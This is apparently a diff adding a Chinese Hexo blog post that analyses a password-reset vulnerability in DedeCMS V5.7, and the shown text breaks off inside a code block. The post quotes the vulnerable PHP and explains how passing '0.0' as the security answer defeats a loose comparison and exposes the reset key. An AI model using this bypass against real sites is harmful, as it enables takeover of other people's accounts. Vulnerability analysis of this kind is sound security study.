@@ -1,0 +1,765 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/config_img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#FCFCFC">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content=".漏洞分析该漏洞产生于**&#x2F;uploads&#x2F;member&#x2F;resetpassword.php**中 123456789101112131415161718192021else if($dopost &#x3D;&#x3D; &quot;safequestion&quot;)&amp;#123;    $mid &#x3D; preg_replace(&quot;#[^0-9]#&quot;, &quot;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DedeCMS-V5.7复现">
+<meta property="og:url" content="http://example.com/2023/12/03/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content=".漏洞分析该漏洞产生于**&#x2F;uploads&#x2F;member&#x2F;resetpassword.php**中 123456789101112131415161718192021else if($dopost &#x3D;&#x3D; &quot;safequestion&quot;)&amp;#123;    $mid &#x3D; preg_replace(&quot;#[^0-9]#&quot;, &quot;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203154456370.png">
+<meta property="og:image" content="d:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203182212611.png">
+<meta property="og:image" content="d:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203181338427.png">
+<meta property="og:image" content="d:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203181610700.png">
+<meta property="og:image" content="d:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203183733967.png">
+<meta property="og:image" content="d:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203184110318.png">
+<meta property="og:image" content="d:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203184356949.png">
+<meta property="article:published_time" content="2023-12-03T07:27:42.000Z">
+<meta property="article:modified_time" content="2023-12-03T10:52:07.224Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="DedeCMS-V5.7复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203154456370.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>DedeCMS-V5.7复现 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"https://tongji.baidu.com/main/setting/51493313/home/site/getjs?siteId=19843729","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null},"path":"window.location.pathname","ignore_local":true},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?https://tongji.baidu.com/main/setting/51493313/home/site/getjs?siteId=19843729";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 78vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Good wine needs no bush</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/config_img/test.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DedeCMS-V5.7复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-03 15:27" pubdate>
+          2023年12月3日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          53 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DedeCMS-V5.7复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title=".漏洞分析"></a>.漏洞分析</h4><p>该漏洞产生于**&#x2F;uploads&#x2F;member&#x2F;resetpassword.php**中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dopost</span> == <span class="hljs-string">&quot;safequestion&quot;</span>)<br>&#123;<br>    <span class="hljs-variable">$mid</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#[^0-9]#&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;<span class="hljs-subst">$mid</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">GetOne</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$safequestion</span>)) <span class="hljs-variable">$safequestion</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$safeanswer</span>)) <span class="hljs-variable">$safeanswer</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safequestion&#x27;</span>] == <span class="hljs-variable">$safequestion</span> &amp;&amp; <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safeanswer&#x27;</span>] == <span class="hljs-variable">$safeanswer</span>)<br>    &#123;<br>        <span class="hljs-title function_ invoke__">sn</span>(<span class="hljs-variable">$mid</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;userid&#x27;</span>], <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;email&#x27;</span>], <span class="hljs-string">&#x27;N&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-title function_ invoke__">ShowMsg</span>(<span class="hljs-string">&quot;对不起，您的安全问题或答案回答错误&quot;</span>,<span class="hljs-string">&quot;-1&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>该.php是一个实现密码找回的功能，从界面中可以看出密码找回是可以通过两个方式找回密码的，一个是邮件找回另一个是通过回答安全问题找回</p>
+<p><img src="D:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203154456370.png" srcset="/img/loading.gif" lazyload alt="image-20231203154456370"></p>
+<p>但从源码中看出，当应用回答安全问题来实现找回密码的时候如果用户没有设置安全问题，在这个函数中对该账户查找对应的安全问题为空则会返回”0”自然回答问题的答案也不会在数据库中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dopost</span> == <span class="hljs-string">&quot;safequestion&quot;</span>)<span class="hljs-comment">//回答安全问题来实现修改密码</span><br>&#123;<br>    <span class="hljs-variable">$mid</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#[^0-9]#&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);<span class="hljs-comment">//处理输入的ID一定为数字</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;<span class="hljs-subst">$mid</span>&#x27;&quot;</span>;<span class="hljs-comment">//sql查询语句</span><br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">GetOne</span>(<span class="hljs-variable">$sql</span>);<span class="hljs-comment">//返回的查询对象$row</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$safequestion</span>)) <span class="hljs-variable">$safequestion</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//判断问题是否为空</span><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$safeanswer</span>)) <span class="hljs-variable">$safeanswer</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//判断问题是否为空</span><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safequestion&#x27;</span>] == <span class="hljs-variable">$safequestion</span> &amp;&amp; <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safeanswer&#x27;</span>] == <span class="hljs-variable">$safeanswer</span>)<br>    &#123;<span class="hljs-comment">//判断安全问题和问题答案是否一致</span><br>        <span class="hljs-title function_ invoke__">sn</span>(<span class="hljs-variable">$mid</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;userid&#x27;</span>], <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;email&#x27;</span>], <span class="hljs-string">&#x27;N&#x27;</span>);<span class="hljs-comment">//一直直接进入sn函数</span><br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-title function_ invoke__">ShowMsg</span>(<span class="hljs-string">&quot;对不起，您的安全问题或答案回答错误&quot;</span>,<span class="hljs-string">&quot;-1&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safequestion&#x27;</span>] == <span class="hljs-variable">$safequestion</span> &amp;&amp; <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safeanswer&#x27;</span>] == <span class="hljs-variable">$safeanswer</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这里的判断相等只用了”&#x3D;&#x3D;”弱比较不考虑参数的类型只考虑参数的数值，因为要修改的用户id对应的safequestion是为”0”的，所有输入的参数只需与其相等即可，但是如果直接输入safequestion&#x3D;0在</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$safequestion</span>)) <span class="hljs-variable">$safequestion</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>就会将safequestion&#x3D;””导致后面的判断呈现””&#x3D;&#x3D;”0”的结果，这当然是不符合的但是可以利用弱比较的特性传入一个”0.0”</p>
+<p><img src="D:/Nodejs/node_global/node_modules/Sharpery-blog/source/_posts/DedeCMS-V5-7%E5%A4%8D%E7%8E%B0/image-20231203182212611.png" srcset="/img/loading.gif" lazyload alt="image-20231203182212611"></p>
+<p>这样既能绕过empty()判空又能绕过if语句进入sn()了</p>
+<p>通过上述分析后继续追查分析sn函数</p>
+<p>打开**&#x2F;uploads&#x2F;member&#x2F;inc&#x2F;inc_pwd_functions.php**</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sn</span>(<span class="hljs-params"><span class="hljs-variable">$mid</span>,<span class="hljs-variable">$userid</span>,<span class="hljs-variable">$mailto</span>, <span class="hljs-variable">$send</span> = <span class="hljs-string">&#x27;Y&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>;<br>    <span class="hljs-variable">$tptim</span>= (<span class="hljs-number">60</span>*<span class="hljs-number">10</span>);<br>    <span class="hljs-variable">$dtime</span> = <span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#x27;<span class="hljs-subst">$mid</span>&#x27;&quot;</span>;<span class="hljs-comment">//查询#@__pwd_tmp字段的所有值</span><br>    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">GetOne</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$row</span>))<br>    &#123;<br>        <span class="hljs-comment">//发送新邮件；</span><br>        <span class="hljs-title function_ invoke__">newmail</span>(<span class="hljs-variable">$mid</span>,<span class="hljs-variable">$userid</span>,<span class="hljs-variable">$mailto</span>,<span class="hljs-string">&#x27;INSERT&#x27;</span>,<span class="hljs-variable">$send</span>);<br>    &#125;<br>    <span class="hljs-comment">//10分钟后可以再次发送新验证码；</span><br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$dtime</span> - <span class="hljs-variable">$tptim</span> &gt; <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;mailtime&#x27;</span>])<br>    &#123;<br>        <span class="hljs-title function_ invoke__">newmail</span>(<span class="hljs-variable">$mid</span>,<span class="hljs-variable">$userid</span>,<span class="hljs-variable">$mailto</span>,<span class="hljs-string">&#x27;UPDATE&#x27;</span>,<span class="hljs-variable">$send</span>);<br>    &#125;<br>    <span class="hljs-comment">//重新发送新的验证码确认邮件；</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ShowMsg</span>(<span class="hljs-string">&#x27;对不起，请10分钟后再重新申请&#x27;</span>, <span class="hljs-string">&#x27;login.php&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到这**newmail($mid,$userid,$mailto,’UPDATE’,$send);**看到newmail函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">newmail</span>(<span class="hljs-params"><span class="hljs-variable">$mid</span>, <span class="hljs-variable">$userid</span>, <span class="hljs-variable">$mailto</span>, <span class="hljs-variable">$type</span>, <span class="hljs-variable">$send</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$db</span>,<span class="hljs-variable">$cfg_adminemail</span>,<span class="hljs-variable">$cfg_webname</span>,<span class="hljs-variable">$cfg_basehost</span>,<span class="hljs-variable">$cfg_memberurl</span>;<br>    <span class="hljs-variable">$mailtime</span> = <span class="hljs-title function_ invoke__">time</span>();<br>    <span class="hljs-variable">$randval</span> = <span class="hljs-title function_ invoke__">random</span>(<span class="hljs-number">8</span>);<span class="hljs-comment">//生成八位随机数</span><br>    <span class="hljs-variable">$mailtitle</span> = <span class="hljs-variable">$cfg_webname</span>.<span class="hljs-string">&quot;:密码修改&quot;</span>;<br>    <span class="hljs-variable">$mailto</span> = <span class="hljs-variable">$mailto</span>;<br>    <span class="hljs-variable">$headers</span> = <span class="hljs-string">&quot;From: &quot;</span>.<span class="hljs-variable">$cfg_adminemail</span>.<span class="hljs-string">&quot;\r\nReply-To: <span class="hljs-subst">$cfg_adminemail</span>&quot;</span>;<br>    <span class="hljs-variable">$mailbody</span> = <span class="hljs-string">&quot;亲爱的&quot;</span>.<span class="hljs-variable">$userid</span>.<span class="hljs-string">&quot;：\r\n您好！感谢您使用&quot;</span>.<span class="hljs-variable">$cfg_webname</span>.<span class="hljs-string">&quot;网。\r\n&quot;</span>.<span class="hljs-variable">$cfg_webname</span>.<span class="hljs-string">&quot;应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：&quot;</span>.<span class="hljs-variable">$randval</span>.<span class="hljs-string">&quot; 请于三天内登陆下面网址确认修改。\r\n&quot;</span>.<span class="hljs-variable">$cfg_basehost</span>.<span class="hljs-variable">$cfg_memberurl</span>.<span class="hljs-string">&quot;/resetpassword.php?dopost=getpasswd&amp;id=&quot;</span>.<span class="hljs-variable">$mid</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$type</span> == <span class="hljs-string">&#x27;INSERT&#x27;</span>)<br>    ......<span class="hljs-comment">//省略</span><br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$type</span> == <span class="hljs-string">&#x27;UPDATE&#x27;</span>)<span class="hljs-comment">//调用的时候传入的type参数为&quot;UPDATE&quot;</span><br>    &#123;<br>        <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$randval</span>);<span class="hljs-comment">//生成md5值</span><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE `#@__pwd_tmp` SET `pwd` = &#x27;<span class="hljs-subst">$key</span>&#x27;,mailtime = &#x27;<span class="hljs-subst">$mailtime</span>&#x27;  WHERE `mid` =&#x27;<span class="hljs-subst">$mid</span>&#x27;;&quot;</span>;<span class="hljs-comment">//查询指定mid下的密码和临时密码</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">ExecuteNoneQuery</span>(<span class="hljs-variable">$sql</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$send</span> == <span class="hljs-string">&#x27;Y&#x27;</span>)<br>            &#123;<br>                <span class="hljs-title function_ invoke__">sendmail</span>(<span class="hljs-variable">$mailto</span>,<span class="hljs-variable">$mailtitle</span>,<span class="hljs-variable">$mailbody</span>,<span class="hljs-variable">$headers</span>);<br>                <span class="hljs-title function_ invoke__">ShowMsg</span>(<span class="hljs-string">&#x27;EMAIL修改验证码已经发送到原来的邮箱请查收&#x27;</span>, <span class="hljs-string">&#x27;login.php&#x27;</span>);<br>            &#125;<br>            <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$send</span> == <span class="hljs-string">&#x27;N&#x27;</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ShowMsg</span>(<span class="hljs-string">&#x27;稍后跳转到修改页&#x27;</span>, <span class="hljs-variable">$cfg_basehost</span>.<span class="hljs-variable">$cfg_memberurl</span>.<span class="hljs-string">&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;</span>.<span class="hljs-variable">$mid</span>.<span class="hljs-string">&quot;&amp;amp;key=&quot;</span>.<span class="hljs-variable">$randval</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-title function_ invoke__">ShowMsg</span>(<span class="hljs-string">&#x27;对不起修改失败，请与管理员联系&#x27;</span>, <span class="hljs-string">&#x27;login.php&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里在sn传入的参数中send是”Y”但是这里是要在”N”时才能涉及关键(疑惑..)</p>
+<p>看到send为”N”的时候，直接跳转回了resetpassword.php中且dopost&#x3D;getpasswd去到该情况下跟主要的是返回了$key</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dopost</span> == <span class="hljs-string">&quot;getpasswd&quot;</span>)<br>&#123;<br>    <span class="hljs-comment">//修改密码</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$id</span>))<br>    &#123;<br>        <span class="hljs-title function_ invoke__">ShowMsg</span>(<span 